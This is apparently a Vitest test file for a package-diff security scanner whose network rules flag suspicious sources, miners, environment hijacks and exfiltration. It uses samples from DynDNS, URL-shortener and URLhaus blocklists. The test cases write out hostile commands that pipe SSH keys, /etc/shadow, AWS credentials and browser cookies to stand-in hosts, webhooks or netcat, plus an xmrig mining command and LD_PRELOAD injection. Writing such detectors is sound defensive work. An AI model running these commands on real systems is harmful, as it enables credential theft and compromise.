import { afterEach, describe, expect, it, vi } from 'vitest';
import { dnsmasqHosts, hostsFileHosts, NETWORK_RULES } from './network.rules';
import { remoteDataLoader } from './rule';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('network rules', () => {
  it.each([
    ['URL-001', 'source=("http://192.0.2.1/payload")'],
    ['URL-002', 'source=("https://bit.ly/abc123")'],
    ['URL-002', 'source=("https://bit.ly:8080/abc123")'],
    ['URL-003', 'source=("https://myhost.duckdns.org/x")'],
    ['URL-003', 'source=("https://myhost.duckdns.org:8443/x")'],
    ['URL-004', 'source=("https://xn--80ak6aa92e.com/")'],
    ['CAUR-ONION-URL', 'curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion'],
    ['EXFIL-003', 'curl -X POST -d @/etc/shadow https://discord.com/api/webhooks/123/token'],
    ['EXFIL-003', 'curl https://api.telegram.org/bot123:token/sendMessage'],
    ['EXFIL-004', 'tar czf - ~/.ssh | curl -X POST --data-binary @- https://evil.example/up'],
    ['EXFIL-004', 'zip -r - .config | curl --data-binary @- https://transfer.sh/x'],
    ['EXFIL-004', 'tar cf - $(pwd) | nc 10.0.0.1 4444'],
    ['EXFIL-004', 'curl --upload-file ~/.ssh/id_rsa https://transfer.sh/'],
    ['EXFIL-004', 'curl -T "$HOME/.aws/credentials" https://evil.example/'],
    ['EXFIL-004', 'wget --post-file=/etc/shadow https://evil.example/'],
    ['EXFIL-004', 'curl -F file=@$HOME/.config/google-chrome/Cookies https://x'],
    ['CRYPTO-001', 'xmrig -o stratum+tcp://pool.example:3333'],
    ['CRYPTO-002', 'install -Dm755 xmrig "$pkgdir"/usr/bin/xmrig'],
    ['ENV-001', 'export LD_PRELOAD=/usr/lib/libinject.so'],
    ['ENV-002', 'PATH=/tmp/bin:$PATH'],
    ['ENV-002', 'export PATH=/tmp/bin:$PATH'],
    ['HIDDEN-002', '/tmp/.cache/payload.sh'],
    ['INSTALL-003', 'curl -o /tmp/x https://example.org'],
    ['NET-001', 'source=("http://example.org/tarball")'],
  ])('flags %s for %j', (id, line) => {
    const options = id === 'INSTALL-003' ? { new_path: 'foo/foo.install' } : {};
    expect(ruleById(NETWORK_RULES, id).check(makeChange(addedOnlyDiff([line]), options))).not.toBeNull();
  });

  it('does not flag network access outside install scriptlets for INSTALL-003', () => {
    const change = makeChange(addedOnlyDiff(['curl -o /tmp/x https://example.org']), {
      new_path: 'foo/PKGBUILD',
    });
    expect(ruleById(NETWORK_RULES, 'INSTALL-003').check(change)).toBeNull();
  });

  it.each([
    ['curl -T ./pkg.tar.zst https://mirror.example/upload/'],
    ['curl -F "file=@dist/app.zip" https://uploads.github.com/x'],
    ['tar czf sources.tar.gz .'],
  ])('does not flag EXFIL-004 for %j', (line) => {
    expect(ruleById(NETWORK_RULES, 'EXFIL-004').check(makeChange(addedOnlyDiff([line])))).toBeNull();
  });

  it('does not flag archive-over-ssh examples inside documentation files', () => {
    const change = makeChange(addedOnlyDiff(['tar czf - ~/data | ssh host restore']), {
      new_path: 'backup/README.md',
    });
    expect(ruleById(NETWORK_RULES, 'EXFIL-004').check(change)).toBeNull();
  });

  it('does not flag https sources', () => {
    const change = makeChange(addedOnlyDiff(['source=("https://example.org/tarball.tar.gz")']));
    expect(ruleById(NETWORK_RULES, 'NET-001').check(change)).toBeNull();
  });
});

describe('network rule data loading', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  function stubBlocklist(hosts: string[]): void {
    const body = hosts.map((host) => `local=/${host}/`).join('\n');
    vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response(body, { status: 200 })));
  }

  function stubHostfile(hosts: string[]): void {
    const body = ['# abuse.ch URLhaus Host file', ...hosts.map((host) => `127.0.0.1\t${host}`)].join('\n');
    vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response(body, { status: 200 })));
  }

  it('downloads once for concurrent and repeat loads, reporting freshness per call', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response('payload', { status: 200 }));
    vi.stubGlobal('fetch', fetchMock);
    const loader = remoteDataLoader({ url: 'https://blocklist.example/list', transform: (raw: string) => raw.length });

    const [first, second, concurrent] = await Promise.all([loader(), loader(), loader()]);

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(first).toEqual({ data: 'payload'.length, downloaded: true });
    expect(second).toEqual({ data: 'payload'.length, downloaded: false });
    expect(concurrent).toEqual({ data: 'payload'.length, downloaded: false });
  });

  it('loads URL-005 from the URLhaus hostfile and matches a listed host', async () => {
    stubHostfile(['stage.example.com', 'c2.example.net']);
    const rule = ruleById(NETWORK_RULES, 'URL-005');
    expect(rule.load).toBeDefined();

    await rule.load?.();

    expect(rule.check(makeChange(addedOnlyDiff(['source=("https://c2.example.net/payload")'])))).not.toBeNull();
  });

  it('does not flag hosts absent from the URLhaus feed for URL-005', async () => {
    stubHostfile(['listed.example']);
    const rule = ruleById(NETWORK_RULES, 'URL-005');

    await rule.load?.();

    expect(
      rule.check(makeChange(addedOnlyDiff(['source=("https://github.com/example/repo/archive/v1.tar.gz")']))),
    ).toBeNull();
  });

  it('loads URL-002 from its blocklist and matches a freshly-added host', async () => {
    stubBlocklist(['shrt.ly', 'newshrt.example']);
    const rule = ruleById(NETWORK_RULES, 'URL-002');
    expect(rule.load).toBeDefined();

    await rule.load?.();

    const change = makeChange(addedOnlyDiff(['source=("https://newshrt.example/abc")']));
    expect(rule.check(change)).not.toBeNull();
  });

  it('loads URL-003 from its blocklist and matches a freshly-added host', async () => {
    stubBlocklist(['freedynamicdns.net', 'dyn-srv.example']);
    const rule = ruleById(NETWORK_RULES, 'URL-003');
    expect(rule.load).toBeDefined();

    await rule.load?.();

    const change = makeChange(addedOnlyDiff(['source=("https://home.dyn-srv.example/x")']));
    expect(rule.check(change)).not.toBeNull();
  });

  it('keeps matching built-in hosts even before the blocklist load', () => {
    const change = makeChange(addedOnlyDiff(['source=("https://bit.ly/abc")']));
    expect(ruleById(NETWORK_RULES, 'URL-002').check(change)).not.toBeNull();
  });
});

describe('dnsmasqHosts (HaGeZi blocklist parsing)', () => {
  // A few real lines pulled from the HaGeZi dyndns.txt / urlshortener.txt dnsmasq lists.
  const REAL_DDNS_SAMPLE = [
    "# Title: HaGeZi's DynDNS Blocklist",
    '# Number of entries: 1520',
    '#',
    'local=/dyn.addr.tools/',
    'local=/changeip.co.uk/',
    'local=/no-ip.co.uk/',
    'local=/duckdns.org/',
    'local=/hopto.org/',
    'local=/zapto.org/',
    '',
  ].join('\n');

  const REAL_SHORTENER_SAMPLE = [
    "# Title: HaGeZi's Blocklist URL Shortener",
    '# Number of entries: 9849',
    '#',
    'local=/bit.ly/',
    'local=/t.co/',
    'local=/tinyurl.com/',
    'local=/shrtn.xyz/',
    'local=/mylinkz.co/',
  ].join('\n');

  it('extracts the bare hosts, skipping headers, comments and blank lines', () => {
    expect(dnsmasqHosts(REAL_DDNS_SAMPLE)).toEqual([
      'dyn.addr.tools',
      'changeip.co.uk',
      'no-ip.co.uk',
      'duckdns.org',
      'hopto.org',
      'zapto.org',
    ]);
  });

  it('extracts shortener hosts', () => {
    expect(dnsmasqHosts(REAL_SHORTENER_SAMPLE)).toEqual(['bit.ly', 't.co', 'tinyurl.com', 'shrtn.xyz', 'mylinkz.co']);
  });

  it('ignores lines that are not in local=/host/ form', () => {
    const junk = [
      'local=/valid.host/',
      'local=/host/path/',
      'server=/not-blocked.example/',
      'address=/172.16.0.1/',
      '0.0.0.0 plain-hosts.example',
      '',
    ].join('\n');
    expect(dnsmasqHosts(junk)).toEqual(['valid.host']);
  });
});

describe('hostsFileHosts (abuse.ch URLhaus hostfile parsing)', () => {
  const REAL_HOSTFILE_SAMPLE = [
    '################################################################',
    '# abuse.ch URLhaus Host file                                   #',
    '# Last updated: 2026-08-22 15:53:17 (UTC)                      #',
    '#',
    '127.0.0.1\t0022a601.pphost.net',
    '127.0.0.1\t123.ywxww.net',
    '',
    '0.0.0.0\tstaging.example.com',
    '10.0.0.7\t192.0.2.9',
  ].join('\n');

  it('extracts hostnames, skipping header comments and blank lines', () => {
    expect(hostsFileHosts(REAL_HOSTFILE_SAMPLE)).toEqual([
      '0022a601.pphost.net',
      '123.ywxww.net',
      'staging.example.com',
    ]);
  });

  it('ignores entries without an IP prefix and IP-literal payloads', () => {
    const junk = ['# header only', 'plain-host.example', '127.0.0.1\t192.0.2.9'].join('\n');
    expect(hostsFileHosts(junk)).toEqual([]);
  });
});
